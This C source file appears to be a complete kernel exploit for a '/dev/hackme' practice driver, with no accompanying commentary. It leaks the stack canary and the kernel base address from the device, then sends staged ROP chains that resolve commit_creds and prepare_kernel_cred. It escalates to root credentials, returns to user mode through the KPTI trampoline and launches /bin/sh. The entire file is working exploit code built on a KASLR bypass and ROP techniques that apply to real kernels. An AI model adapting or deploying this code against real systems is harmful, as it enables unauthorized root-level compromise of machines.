#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int fd;
unsigned long canary;

unsigned long user_ss, user_rsp, user_rflags, user_cs;

volatile unsigned long prepare_kernel_cred;
volatile unsigned long commit_creds;
int offset_prepare_kernel_cred;
int offset_commit_creds;

const unsigned long orig_base = 0xffffffff81000000ul;
volatile unsigned long base;

// 0xffffffff81006370: pop %rdi; ret; 
const unsigned long pop_rdi = 0xffffffff81006370ul - orig_base;

const unsigned long kpti_trampoline = 0xffffffff81200f10ul + 0x16 - orig_base;

// 0xffffffff81004aae: mov 0x10(%rax), %eax; pop %rbp; ret;
const unsigned long mov_10drax_eax_pop_rbp = 0xffffffff81004aaeul - orig_base;
// 0xffffffff81004d11: pop %rax; ret; 
const unsigned long pop_rax = 0xffffffff81004d11ul - orig_base;
const unsigned long ksym_prepare_kernel_cred = 0xffffffff81f8d4fcul - orig_base;
const unsigned long ksym_commit_creds = 0xffffffff81f87d90ul - orig_base;


void save_state(void) {
  asm volatile(
               "mov %cs, user_cs;"
               "mov %ss, user_ss;"
               "mov %rsp, user_rsp;"
               "pushfq; popq user_rflags;");
}

void init(void) {
  fd = open("/dev/hackme", O_RDWR);
  if (fd == -1) {
    puts("[!] error opening file");
    exit(-1);
  }

  save_state();
}

void hexdump(unsigned long *p, size_t n) {
  for (size_t i = 0; i < n; ++i) {
    printf("%03lu: %lx\n", i, p[i]);
  }
}

void shell(void) {
  system("/bin/sh");
}

void escalate_privs(void) {
  unsigned long init_cred = base+17174304;

  unsigned long leak[42];
  memset(leak, 0x41, 42*sizeof(unsigned long));

  unsigned long *rop = leak+16;
  *rop++ = canary;
  *rop++ = 0xc0fe;
  *rop++ = 0xdead;
  *rop++ = 0xbeaf;
  *rop++ = pop_rdi+base;
  *rop++ = init_cred;
  *rop++ = commit_creds;
  *rop++ = kpti_trampoline+base;
  *rop++ = 1;
  *rop++ = 2;
  *rop++ = (unsigned long)shell+1;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_rsp;
  *rop++ = user_ss;

  write(fd, leak, sizeof(leak));
}

void get_commit_creds(void) {
  asm volatile(
               "mov %eax, offset_commit_creds"
               );
  commit_creds = ksym_commit_creds + offset_commit_creds + base;
  puts("[+] stage2");
  printf("commit_creds: 0x%lx\n", commit_creds);

  unsigned long leak[42];
  memset(leak, 0x41, 42*sizeof(unsigned long));

  unsigned long *rop = leak+16;
  *rop++ = canary;
  *rop++ = 0xc0fe;
  *rop++ = 0xdead;
  *rop++ = 0xbeaf;
  *rop++ = pop_rax+base;
  *rop++ = ksym_commit_creds-0x10+base;
  *rop++ = mov_10drax_eax_pop_rbp+base;
  *rop++ = 0xc0ff33;
  *rop++ = kpti_trampoline+base;
  *rop++ = 1;
  *rop++ = 2;
  *rop++ = (unsigned long)escalate_privs;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_rsp;
  *rop++ = user_ss;

  write(fd, leak, sizeof(leak));
}

void get_prepare_kernel_cred(void) {
  asm volatile(
               "mov %eax, offset_prepare_kernel_cred"
               );
  prepare_kernel_cred = ksym_prepare_kernel_cred +
    offset_prepare_kernel_cred + base;
  puts("[+] stage1");
  printf("prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);

  unsigned long leak[42];
  memset(leak, 0x41, 42*sizeof(unsigned long));

  unsigned long *rop = leak+16;
  *rop++ = canary;
  *rop++ = 0xc0fe;
  *rop++ = 0xdead;
  *rop++ = 0xbeaf;
  *rop++ = pop_rax+base;
  *rop++ = ksym_commit_creds-0x10+base;
  *rop++ = mov_10drax_eax_pop_rbp+base;
  *rop++ = 0xc0ff33;
  *rop++ = kpti_trampoline+base;
  *rop++ = 1;
  *rop++ = 2;
  *rop++ = (unsigned long)get_commit_creds;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_rsp;
  *rop++ = user_ss;

  write(fd, leak, sizeof(leak));
}

int main() {
  puts("[+] nyahallo");
  init();

  unsigned long leak[42];
  read(fd, leak, 42*sizeof(unsigned long));
  hexdump(leak, 42);

  canary = leak[16];
  printf("canary: 0x%lx\n", canary);

  base = leak[38] - 0xa157;
  printf("base: 0x%lx", base);

  memset(leak, 0x41, 42*sizeof(unsigned long));

  unsigned long *rop = leak+16;
  *rop++ = canary;
  *rop++ = 0xc0fe;
  *rop++ = 0xdead;
  *rop++ = 0xbeaf;
  *rop++ = pop_rax+base;
  *rop++ = ksym_prepare_kernel_cred-0x10+base;
  *rop++ = mov_10drax_eax_pop_rbp+base;
  *rop++ = 0xc0ff33;
  *rop++ = kpti_trampoline+base;
  *rop++ = 1;
  *rop++ = 2;
  *rop++ = (unsigned long)get_prepare_kernel_cred;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_rsp;
  *rop++ = user_ss;

  write(fd, leak, sizeof(leak));


  puts("[!] exploit failed ;_;");
  return 0;
}
